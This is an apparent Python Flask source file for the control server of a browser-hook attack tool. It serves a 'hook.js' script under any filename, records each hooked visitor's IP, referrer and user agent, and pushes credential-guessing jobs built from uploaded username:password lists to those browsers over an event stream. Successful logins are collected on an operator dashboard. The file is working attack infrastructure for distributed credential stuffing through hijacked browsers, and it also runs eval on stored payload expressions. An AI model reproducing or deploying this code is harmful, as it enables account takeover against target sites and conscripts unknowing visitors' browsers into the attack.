from flask import g, session, request, jsonify, render_template, Response, after_this_request, abort
from flask_cors import cross_origin
from cef import app, db, rs
from cef.models import User, Node, Attack, Result
from cef.utils import fingerprint
from functools import wraps
from time import sleep
import json
import os
import pickle

@app.before_request
def load_user():
    g.user = None
    uid = session.get('id')
    if uid:
        g.user = User.query.get(uid)

def auth_required(func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        if g.user:
            return func(*args, **kwargs)
        abort(401)
    return wrapped

def build_attack(attack_id, u, p):
    attack = Attack.query.get(attack_id)
    a = {
        'id': attack_id,
        'method': attack.method,
        'url': attack.url,
        'payload': eval(attack.payload_exp),
        'content_type': attack.content_type,
    }
    return a

def rebuild_attack(attack_id, payload):
    a = build_attack(attack_id, 'u', 'p')
    a['payload'] = payload
    return a

def attacks_stream():
    while True:
        sleep(1)
        attack = rs.brpop('attacks')
        payload = 'retry: {}\n'.format(3000)
        payload += 'data: {}\n\n'.format(attack[1])
        yield payload

def results_stream():
    while True:
        sleep(1)
        result = rs.brpop('results')
        payload = 'retry: {}\n'.format(3000)
        payload +='data: {}\n\n'.format(result[1])
        yield payload

# streaming controllers

@app.route('/stream/attacks')
@cross_origin()
def stream_attacks():
    fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
    if not Node.get_by_fingerprint(fp):
        node = Node(
            fingerprint=fp,
            ip_address=request.remote_addr,
            target=request.referrer,
            user_agent=request.user_agent.string,
        )
        db.session.add(node)
        db.session.commit()
    response = Response(attacks_stream(), mimetype='text/event-stream')
    response.headers['Cache-Control'] = 'no-cache'
    return response

@app.route('/stream/results')
@auth_required
def stream_results():
    response = Response(results_stream(), mimetype='text/event-stream')
    response.headers['Cache-Control'] = 'no-cache'
    return response

# attack controllers

# go ahead. call the js file whatever you want.
@app.route('/<string:filename>.js')
def js_file(filename):
    @after_this_request
    def add_header(response):
        response.headers['Content-Type'] = 'application/javascript'
        return response
    return render_template('hook.js')

@app.route('/api/results', methods=['POST'])
@cross_origin()
def add_result():
    jsonobj = json.loads(request.data.decode('utf-8'))
    attack = Attack.query.get(jsonobj.get('id') or -1)
    resp = jsonobj.get('result')
    payload = jsonobj.get('payload')
    # process a valid request
    if all((attack, resp, payload)):
        # process a successful guess
        if attack.success in resp:
            # store the results
            fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
            node = Node.get_by_fingerprint(fp)
            result = Result(
                attack_id=attack.id,
                node_id=node.id,
                payload=payload
            )
            db.session.add(result)
            db.session.commit()
            # update dashboard
            rs.lpush('results', json.dumps(result.serialize()))
        # process an unsuccessful guess
        elif attack.fail in resp:
            # ignore the result
            pass
        # process an unexpected result
        else:
            # re-queue the payload
            a = rebuild_attack(attack.id, payload)
            rs.lpush('attacks', json.dumps(a))
    # process a bad request
    else:
        # can't re-queue the payload without a valid attack id
        abort(400)
    return '', 201

# dashboard controllers

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/constants.js')
def js_constants():
    return render_template('constants.js')

@app.route('/auth', methods=['POST'])
def auth():
    username = request.json.get('username')
    password = request.json.get('password')
    user = User.get_by_username(username)
    response = {}
    if user and user.check_password(password):
        session['id'] = user.id
        response['user'] = user.serialize()
    return jsonify(**response), 200

@app.route('/unauth')
def unauth():
    session.clear()
    return '', 204

# attack_id must be a string in order to create url dynamically in js
@app.route('/attack', methods=['POST'])
@auth_required
def run_attack():
    attack = request.json.get('id')
    filename = request.json.get('filename')
    with open(app.config['FILES_DIR'] + filename) as fp:
        for line in fp:
            u, p = line.strip().split(':', 1)
            a = build_attack(attack, u, p)
            rs.lpush('attacks', json.dumps(a))
    return '', 204

@app.route('/api/status')
@auth_required
def get_status():
    length = rs.llen('attacks')
    message = 'attacking...' if length else 'idle'
    return jsonify(status={'message': message, 'length': length}), 200

@app.route('/api/results')
@auth_required
def get_results():
    results = [r.serialize() for r in Result.query.all()]
    return jsonify(results=results), 200

@app.route('/api/attacks')
@auth_required
def get_attacks():
    attacks = [a.serialize() for a in Attack.query.all()]
    for (dirpath, dirnames, filenames) in os.walk(app.config['FILES_DIR']):
        files = [f for f in filenames]
        break
    return jsonify(attacks=attacks, files=files), 200

@app.route('/api/attacks', methods=['POST'])
@auth_required
def add_attacks():
    attack = Attack(
        method=request.json.get('method'),
        url=request.json.get('url'),
        payload_exp=request.json.get('payloadExp'),
        content_type=request.json.get('contentType'),
        success=request.json.get('success'),
        fail=request.json.get('fail'),
    )
    db.session.add(attack)
    db.session.commit()
    return jsonify(attack=attack.serialize()), 201
